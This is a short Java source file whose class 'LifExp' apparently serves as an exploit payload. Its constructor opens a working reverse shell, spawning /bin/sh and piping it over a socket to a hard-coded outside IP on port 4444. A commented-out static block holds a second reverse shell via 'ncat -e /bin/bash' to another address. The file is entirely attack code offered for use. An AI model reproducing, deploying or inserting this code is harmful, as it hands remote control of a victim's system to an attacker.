import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class LifExp {

  public LifExp() throws Exception {
    String host="103.130.218.69";
    int port=4444;
    String cmd="/bin/sh";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
}
/*static {
try {
String[] cmd = {"ncat", "103.130.218.210", "4444", "-e", "/bin/bash"};
//String cmd = "ncat 103.130.218.210 4444 -e /bin/bash";
java.lang.Runtime.getRuntime().exec(cmd).waitFor();
} catch ( Exception e ) {
e.printStackTrace();
}
}
}
*/
